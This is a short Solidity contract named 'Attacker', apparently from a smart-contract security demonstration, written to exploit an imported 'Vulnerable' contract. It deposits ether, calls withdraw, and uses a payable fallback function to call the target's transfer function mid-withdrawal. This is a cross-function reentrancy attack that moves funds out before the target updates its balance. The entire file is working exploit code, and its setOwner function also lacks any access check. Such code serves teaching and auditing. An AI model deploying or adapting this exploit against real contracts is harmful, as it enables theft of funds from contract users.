pragma solidity >0.4.99 <0.6.0;

import "./Vulnerable.sol";

contract Attacker {
  address payable private owner;
  Vulnerable private vulnerable;

  constructor(address _vulnerableAddr) public {
    owner = msg.sender;
    vulnerable = Vulnerable(_vulnerableAddr);
  }

  function setOwner(address payable _owner) public {
    owner = _owner;
  }

  function () payable external {
    vulnerable.transfer(owner, msg.value);
  }

  function deposit() payable public {
    vulnerable.deposit.value(msg.value)();
  }

  function withdraw() public {
    vulnerable.withdraw();
    require(owner.send(address(this).balance));
  }
}
